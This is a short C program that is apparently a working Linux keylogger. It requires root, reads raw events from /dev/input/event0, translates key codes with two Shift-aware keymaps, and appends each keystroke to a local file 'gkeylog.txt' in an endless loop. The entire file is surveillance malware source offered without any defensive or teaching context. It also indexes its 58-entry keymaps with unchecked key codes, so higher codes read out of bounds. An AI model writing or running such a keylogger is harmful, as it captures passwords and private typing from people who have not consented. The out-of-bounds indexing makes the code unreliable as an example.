#include <stdio.h>
#include <linux/input.h>
#include <sys/types.h>
#include <unistd.h>
// Keymap upto 59 Input_Event Codes
// Keymap Shift not pressed
char keymap[58] = {0,0,'1','2','3','4','5','6','7','8',    
				   '9','0','-','=','\x08','\x09','q','w','e','r',  	
				  't','y','u','i','o','p','[',']','\n',0,		
				   'a','s','d','f','g','h','j','k','l',';',   
				   '\'','`',0,'\\','z','x','c','v','b','n',			
				   'm',',','.','/',0,'*',0,' '};		
// Keymap Shift pressed 						   
char skeymap[58] = {0,0,'!','@','#','$','%','^','&','*',    
				   '(',')','_','+','\x08','\x09','Q','W','E','R',  	
				  'T','Y','U','I','O','P','{','}','\n',0,		
				   'A','S','D','F','G','H','J','K','L',':',   
				   '"','~',0,'|','Z','X','C','V','B','N',			
				   'M','<','>','?',0,'*',0,' '};			
int main (void) {
	if(getuid()!=0){
		printf("[!] Root priviledge is required!!!\n");
		return 1;
	}
	int shift=0;
	struct input_event ev;
	int ev_size=sizeof(struct input_event);
	FILE *pkey = fopen("/dev/input/event0","r");
	FILE *pkeylog = fopen("gkeylog.txt","a");
	if (pkey==NULL || pkeylog==NULL) {
		perror ("[-] Error openning Files\n");
		return 1;
	}
	do {
		fread((void *)&ev,ev_size,1,pkey);  
		// ev.type: EV_KEY 1 
		// ev.code: SHIFT 42 or 54
		if(ev.type==1 && (ev.code==42 || ev.code==54)) {
			// ev.value: KEY_PRESS 1
			if(ev.value==1) {
				shift=1;
				continue;
			}
			// ev.value: KEY_UP 0
			if(ev.value==0) {
				shift=0;
				continue;
			}
		}
		if(ev.type==1 && ev.value==0){ 
			if(shift) {
				fputc((int)skeymap[ev.code],pkeylog);
			} else {
				fputc((int)keymap[ev.code],pkeylog);
			}
			fflush(pkeylog);
		}      		
   	} while(1);
	fclose(pkeylog);
	fclose(pkey);
	return 0;
}

